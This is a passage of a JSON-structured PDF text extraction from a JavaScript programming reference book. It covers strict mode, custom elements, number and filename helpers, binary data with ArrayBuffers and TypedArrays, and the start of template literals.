        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  strict_scope ()   {     \"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    var  a  =   \"bar\" ;   // variable is local }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "strict_scope ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( a );   // >> \"ReferenceError: a is not defined\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The variable can also be declared outside and after a function, allowing it to be used, for instance, in the global scope:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 296",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  strict_scope ()   {     \"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   a  =   \"bar\" ;   // variable is global }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  a ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "strict_scope (); console. log ( a );   // >> bar",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 50.5: Duplicate Parameters",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Strict mode does not allow you to use duplicate function parameter names.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( bar ,  bar )   {}    // No error. bar is set to the final argument when called",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "\"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo ( bar ,  bar )   {};   // SyntaxError: duplicate formal argument bar",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 50.6: Function scoping in strict mode",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In Strict Mode, functions declared in a local block are inaccessible outside the block.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"use strict\" ; {   f ();   // 'hi'    function  f ()   { console. log ( 'hi' );} }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "f ();   // ReferenceError: f is not defined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Scope-wise, function declarations in Strict Mode have the same kind of binding as  let  or  const .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.7: Behaviour of a function's arguments list",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "arguments  object behave di\ufb00erent in  strict  and  non strict  mode. In  non-strict  mode, the  argument  object will re\ufb02ect the changes in the value of the parameters which are present, however in  strict  mode any changes to the value of the parameter will not be re\ufb02ected in the  argument  object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  add ( a ,  b ){     console. log ( arguments [ 0 ],  arguments [ 1 ]);   // Prints : 1,2     a  =   5 ,  b  =   10 ;     console. log ( arguments [ 0 ],  arguments [ 1 ]);   // Prints : 5,10 } add ( 1 ,   2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For the above code, the  arguments  object is changed when we change the value of the parameters. However, for strict  mode, the same will not be re\ufb02ected.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  add ( a ,  b )   {      'use strict' ;     console. log ( arguments [ 0 ],  arguments [ 1 ]);   // Prints : 1,2     a  =   5 ,  b  =   10 ;     console. log ( arguments [ 0 ],  arguments [ 1 ]);   // Prints : 1,2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 297 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "It's worth noting that, if any one of the parameters is  undefined , and we try to change the value of the parameter in both  strict-mode  or  non-strict  mode the  arguments  object remains unchanged.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Strict mode",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  add ( a ,  b )   {      'use strict' ;     console. log ( arguments [ 0 ],  arguments [ 1 ]);   // undefined,undefined                                               // 1,undefined     a  =   5 ,  b  =   10 ;     console. log ( arguments [ 0 ],  arguments [ 1 ]);   // undefined,undefined                                               // 1, undefined } add ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// undefined,undefined // undefined,undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "add ( 1 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// 1, undefined // 1, undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Non-Strict Mode",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  add ( a , b )   {     console. log ( arguments [ 0 ], arguments [ 1 ]);     a  =   5 ,  b  =   10 ;     console. log ( arguments [ 0 ], arguments [ 1 ]); } add ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// undefined,undefined // undefined,undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "add ( 1 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// 1, undefined // 5, undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 50.8: Non-Simple parameter lists",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "function  a ( x  =   5 )   {    \"use strict\" ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "is invalid JavaScript and will throw a  SyntaxError  because you cannot use the directive  \"use strict\"  in a function with Non-Simple Parameter list like the one above - default assignment  x  =   5 Non-Simple parameters include - Default assignment",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  a ( x  =   1 )   {    \"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 298 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Destructuring",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  a ({  x  })   {    \"use strict\" ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Rest params",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  a ( ... args )   {    \"use strict\" ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 299",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 51: Custom Elements",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details name",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The name of the new custom element. options.extends The name of the native element being extended, if any. options.prototype The custom prototype to use for the custom element, if any.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 51.1: Extending Native Elements",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "It's possible to extent native elements, but their descendants don't get to have their own tag names. Instead, the  is attribute is used to specify which subclass an element is supposed to use. For example, here's an extension of the <img>  element which logs a message to the console when it's loaded.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const   prototype   =  Object. create ( HTMLImageElement. prototype ); prototype . createdCallback   =   function ()   {    this . addEventListener ( 'load' ,  event  =>   {       console. log ( \"Image loaded successfully.\" );    }); }; document. registerElement ( 'ex-image' ,   {   extends :   'img' ,   prototype :   prototype   }); <img   is = \"ex-image\"   src = \"http://cdn.sstatic.net/Sites/stackoverflow/img/apple-touch-icon.png\"   />",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 51.2: Registering New Elements",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "De\ufb01nes an  <initially-hidden>  custom element which hides its contents until a speci\ufb01ed number of seconds have elapsed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  InitiallyHiddenElement  =  document. registerElement ( 'initially-hidden' ,   class   extends HTMLElement  {   createdCallback ()   {      this . revealTimeoutId   =   null ;    }   attachedCallback ()   {      const  seconds  =  Number ( this . getAttribute ( 'for' ));      this . style . display   =   'none' ;      this . revealTimeoutId   =  setTimeout (()   =>   {        this . style . display   =   'block' ;      },  seconds  *   1000 );    }   detachedCallback ()   {      if   ( this . revealTimeoutId )   {       clearTimeout ( this . revealTimeoutId );        this . revealTimeoutId   =   null ;      }    } });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<initially-hidden   for = \"2\" > Hello </initially-hidden> <initially-hidden   for = \"5\" > World </initially-hidden>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 300",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 52: Data Manipulation",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 52.1: Format numbers as money",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Fast and short way to format value of type  Number  as money, e.g.  1234567.89   =>   \"1,234,567.89\" :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  num  =   1234567.89 ,     formatted ; formatted  =  num. toFixed ( 2 ) . replace ( /\\d(?=(\\d{3})+\\.)/g ,   '$&,' );    // \"1,234,567.89\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "More advanced variant with support of any number of decimals  [ 0  ..  n ] , variable size of number groups  [ 0  ..  x ] and di\ufb00erent delimiter types: /**",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": " * Number.prototype.format(n, x, s, c)  *  * @param integer n: length of decimal  * @param integer x: length of whole part  * @param mixed   s: sections delimiter  * @param mixed   c: decimal delimiter  */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Number. prototype . format   =   function ( n ,  x ,  s ,  c )   {      var  re  =   ' \\\\ d(?=( \\\\ d{'   +   ( x  ||   3 )   +   '})+'   +   ( n  >   0   ?   ' \\\\ D'   :   '$' )   +   ')' ,         num  =   this . toFixed ( Math. max ( 0 ,  ~~n ));      return   ( c  ?  num. replace ( '.' ,  c )   :  num ) . replace ( new  RegExp ( re ,   'g' ),   '$&'   +   ( s  ||   ',' )); }; 12345678.9 . format ( 2 ,   3 ,   '.' ,   ',' );    // \"12.345.678,90\" 123456.789 . format ( 4 ,   4 ,   ' ' ,   ':' );    // \"12 3456:7890\" 12345678.9 . format ( 0 ,   3 ,   '-' );         // \"12-345-679\" 123456789 .. format ( 2 );                 // \"123,456,789.00\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 52.2: Extract extension from \ufb01le name",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Fast and short way to extract extension from \ufb01le name in JavaScript will be:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  get_extension ( filename )   {      return  filename. slice (( filename. lastIndexOf ( '.' )   -   1   >>>   0 )   +   2 ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It works correctly both with names having no extension (e.g.  myfile ) or starting with  .  dot (e.g.  . htaccess ):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "get_extension ( '' )                             // \"\" get_extension ( 'name' )                         // \"\" get_extension ( 'name.txt' )                     // \"txt\" get_extension ( '.htpasswd' )                    // \"\" get_extension ( 'name.with.many.dots.myext' )    // \"myext\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The following solution may extract \ufb01le extensions from full path:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  get_extension ( path )   {      var  basename  =  path. split (/[ \\\\ /]/) . pop (),    // extract file name from full path ...                                                 // (supports `\\\\` and `/` separators)         pos  =  basename. lastIndexOf ( '.' );         // get last position of `.`",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 301",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     if   ( basename  ===   ''   ||  pos  <   1 )              // if file name is empty or ...          return   \"\" ;                               //  `.` not found (-1) or comes first (0)      return  basename. slice ( pos  +   1 );              // extract extension ignoring `.` } get_extension ( '/path/to/file.ext' );    // \"ext\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 52.3: Set object property given its string name",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "function  assign ( obj ,  prop ,  value )   {      if   ( typeof  prop  ===   'string' )         prop  =  prop. split ( '.' );      if   ( prop. length   >   1 )   {          var  e  =  prop. shift ();         assign ( obj [ e ]   =                  Object. prototype . toString . call ( obj [ e ])   ===   '[object Object]'                   ?  obj [ e ]                   :   {},                prop ,                value );      }   else         obj [ prop [ 0 ]]   =  value ; } var  obj  =   {},     propName  =   'foo.bar.foobar' ; assign ( obj ,  propName ,   'Value' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// obj == { //   foo : { //     bar : { //       foobar : 'Value' //     } //   } // }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 302",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 53: Binary Data",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 53.1: Getting binary representation of an image \ufb01le",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This example is inspired by  this question . We'll assume you know how to  load a \ufb01le using the File API .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// preliminary code to handle getting local file and finally printing to console // the results of our function ArrayBufferToBinary(). var  file  =   // get handle to local file.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  reader  =   new  FileReader (); reader. onload   =   function ( event )   {      var  data  =  event. target . result ;     console. log ( ArrayBufferToBinary ( data )); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "reader. readAsArrayBuffer ( file );   //gets an ArrayBuffer of the file",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now we perform the actual conversion of the \ufb01le data into 1's and 0's using a  DataView :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  ArrayBufferToBinary ( buffer )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    // Convert an array buffer to a string bit-representation: 0 1 1 0 0 0...",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    var  dataView  =   new  DataView ( buffer );     var  response  =   \"\" ,  offset  =   ( 8 / 8 );     for ( var  i  =   0 ;  i  <  dataView. byteLength ;  i  +=  offset )   {        response  +=  dataView. getInt8 ( i ) . toString ( 2 );     }     return  response ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "DataView s let you read/write numeric data;  getInt8  converts the data from the byte position - here  0 , the value passed in - in the  ArrayBuffer  to signed 8-bit integer representation, and  toString ( 2 )  converts the 8-bit integer to binary representation format (i.e. a string of 1's and 0's). Files are saved as bytes. The 'magic' o\ufb00set value is obtained by noting we are taking \ufb01les stored as bytes i.e. as 8-bit integers and reading it in 8-bit integer representation. If we were trying to read our byte-saved (i.e. 8 bits) \ufb01les to 32-bit integers, we would note that 32/8 = 4 is the number of byte spaces, which is our byte o\ufb00set value. For this task,  DataView s are overkill. They are typically used in cases where endianness or heterogeneity of data are encountered (e.g. in reading PDF \ufb01les, which have headers encoded in di\ufb00erent bases and we would like to meaningfully extract that value). Because we just want a textual representation, we do not care about heterogeneity as there is never a need to A much better - and shorter - solution can be found using an  UInt8Array  typed array, which treats the entire ArrayBuffer  as composed of unsigned 8-bit integers:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  ArrayBufferToBinary ( buffer )   {      var  uint8  =   new  Uint8Array ( buffer );      return  uint8. reduce (( binary ,  uint8 )   =>  binary  +  uint8. toString ( 2 ),   \"\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 53.2: Converting between Blobs and ArrayBu\ue023ers",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript has two primary ways to represent binary data in the browser. ArrayBu\ufb00ers/TypedArrays contain mutable (though still \ufb01xed-length) binary data which you can directly manipulate. Blobs contain immutable binary",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 303",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "data which can only be accessed through the asynchronous File interface.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Convert a  Blob  to an  ArrayBuffer  (asynchronous)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  blob  =   new  Blob ([ \" \\x 01 \\x 02 \\x 03 \\x 04\" ]),     fileReader  =   new  FileReader (),     array ; fileReader. onload   =   function ()   {     array  =   this . result ;     console. log ( \"Array contains\" ,  array. byteLength ,   \"bytes.\" ); }; fileReader. readAsArrayBuffer ( blob );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Convert a  Blob  to an  ArrayBuffer  using a  Promise  (asynchronous)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  blob  =   new  Blob ([ \" \\x 01 \\x 02 \\x 03 \\x 04\" ]); var  arrayPromise  =   new  Promise ( function ( resolve )   {      var  reader  =   new  FileReader ();     reader. onloadend   =   function ()   {         resolve ( reader. result );      };     reader. readAsArrayBuffer ( blob ); }); arrayPromise. then ( function ( array )   {     console. log ( \"Array contains\" ,  array. byteLength ,   \"bytes.\" ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Convert an  ArrayBuffer  or typed array to a  Blob",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   new  Uint8Array ([ 0x04 ,  0x06 ,  0x07 ,  0x08 ]); var  blob  =   new  Blob ([ array ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 53.3: Manipulating ArrayBu\ue023ers with DataViews",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "DataViews provide methods to read and write individual values from an ArrayBu\ufb00er, instead of viewing the entire thing as an array of a single type. Here we set two bytes individually then interpret them together as a 16-bit unsigned integer, \ufb01rst big-endian then little-endian.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  buffer  =   new  ArrayBuffer ( 2 ); var  view  =   new  DataView ( buffer ); view. setUint8 ( 0 ,  0xFF ); view. setUint8 ( 1 ,  0x01 ); console. log ( view. getUint16 ( 0 ,   false ));   // 65281 console. log ( view. getUint16 ( 0 ,   true ));    // 511",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 53.4: Creating a TypedArray from a Base64 string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  data  =     'iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACN'   +     'byblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHx'   +     'gljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 304",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  characters  =  atob ( data ); var  array  =   new  Uint8Array ( characters. length ); for   ( var  i  =   0 ;  i  <  characters. length ;  i ++)   {   array [ i ]   =  characters. charCodeAt ( i ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 53.5: Using TypedArrays",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "TypedArrays are a set of types providing di\ufb00erent views into \ufb01xed-length mutable binary ArrayBu\ufb00ers. For the most part, they act like Arrays that coerce all assigned values to a given numeric type. You can pass an ArrayBu\ufb00er instance to a TypedArray constructor to create a new view of its data.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  buffer  =   new  ArrayBuffer ( 8 ); var  byteView  =   new  Uint8Array ( buffer ); var  floatView  =   new  Float64Array ( buffer );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( byteView );    // [0, 0, 0, 0, 0, 0, 0, 0]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( floatView );   // [0] byteView [ 0 ]   =  0x01 ; byteView [ 1 ]   =  0x02 ; byteView [ 2 ]   =  0x04 ; byteView [ 3 ]   =  0x08 ; console. log ( floatView );   // [6.64421383e-316]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ArrayBu\ufb00ers can be copied using the  . slice ( ... )  method, either directly or through a TypedArray view.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  byteView2  =  byteView. slice (); var  floatView2  =   new  Float64Array ( byteView2. buffer ); byteView2 [ 6 ]   =  0xFF ; console. log ( floatView );    // [6.64421383e-316] console. log ( floatView2 );   // [7.06327456e-304]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 53.6: Iterating through an arrayBu\ue023er",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "For a convenient way to iterate through an arrayBu\ufb00er, you can create a simple iterator that implements the DataView  methods under the hood:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  ArrayBufferCursor  =   function ()   {    var  ArrayBufferCursor  =   function ( arrayBuffer )   {      this . dataview   =   new  DataView ( arrayBuffer ,   0 );      this . size   =  arrayBuffer. byteLength ;      this . index   =   0 ;    }   ArrayBufferCursor. prototype . next   =   function ( type )   {      switch ( type )   {        case   'Uint8' :          var  result  =   this . dataview . getUint8 ( this . index );          this . index   +=   1 ;          return  result ;        case   'Int16' :          var  result  =   this . dataview . getInt16 ( this . index ,   true );          this . index   +=   2 ;          return  result ;        case   'Uint16' :          var  result  =   this . dataview . getUint16 ( this . index ,   true );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 305",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "         this . index   +=   2 ;          return  result ;        case   'Int32' :          var  result  =   this . dataview . getInt32 ( this . index ,   true );          this . index   +=   4 ;          return  result ;        case   'Uint32' :          var  result  =   this . dataview . getUint32 ( this . index ,   true );          this . index   +=   4 ;          return  result ;        case   'Float' :        case   'Float32' :          var  result  =   this . dataview . getFloat32 ( this . index ,   true );          this . index   +=   4 ;          return  result ;        case   'Double' :        case   'Float64' :          var  result  =   this . dataview . getFloat64 ( this . index ,   true );          this . index   +=   8 ;          return  result ;        default :          throw   new  Error ( \"Unknown datatype\" );      }    };   ArrayBufferCursor. prototype . hasNext   =   function ()   {      return   this . index   <   this . size ;    }    return  ArrayBufferCursor ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can then create an iterator like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  cursor  =   new  ArrayBufferCursor ( arrayBuffer );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can use the  hasNext  to check if there's still items",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for (; cursor. hasNext ();)   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // There's still items to process }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can use the  next  method to take the next value:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  nextValue  =  cursor. next ( 'Float' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With such an iterator, writing your own parser to process binary data becomes pretty easy.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 306",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 54: Template Literals",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Template literals are a type of string literal that allows values to be interpolated, and optionally the interpolation and construction behaviour to be controlled using a \"tag\" function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 54.1: Basic interpolation and multiline strings",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Template literals are a special type of string literal that can be used instead of the standard  '...'  or  \"...\" . They are declared by quoting the string with backticks instead of the standard single or double quotes:  `...` . Template literals can contain line breaks and arbitrary expressions can be embedded using the  $ {  expression  } substitution syntax. By default, the values of these substitution expressions are concatenated directly into the string where they appear.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  name  =   \"John\" ; const  score  =   74 ; console. log ( `Game Over ! $ { name } 's score was ${score * 10}.`); Game Over ! John 's score was 740.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 54.2: Tagged strings",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A function identi\ufb01ed immediately before a template literal is used to interpret it, in what is called a  tagged template literal . The tag function can return a string, but it can also return any other type of value. The \ufb01rst argument to the tag function,  strings , is an Array of each constant piece of the literal. The remaining arguments,  ... substitutions , contain the evaluated values of each  $ {}  substitution expression.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  settings ( strings ,  ... substitutions )   {    const  result  =   new  Map ();    for   ( let  i  =   0 ;  i  <  substitutions. length ;  i ++)   {     result. set ( strings [ i ] . trim (),  substitutions [ i ]);    }    return  result ; } const  remoteConfiguration  =  settings`   label    $ { 'Content' }   servers  $ { 2   *   8   +   1 }   hostname $ { location. hostname } ` ; Map  { \"label\"   =>   \"Content\" ,   \"servers\"   =>   17 ,   \"hostname\"   =>   \"stackoverflow.com\" }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  strings  Array has a special  . raw  property referencing a parallel Array of the same constant pieces of the template literal but  exactly  as they appear in the source code, without any backslash-escapes being replaced.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  example ( strings ,  ... substitutions )   {   console. log ( 'strings:' ,  strings );   console. log ( '...substitutions:' ,  substitutions ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 307",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "example`Hello $ { 'world' } .\\n\\nHow are you ? ` ; strings :   [ \"Hello \" ,   \". \\n\\n How are you?\" ,  raw :   [ \"Hello \" ,   \". \\\\ n \\\\ nHow are you?\" ]] substitutions :   [ \"world\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
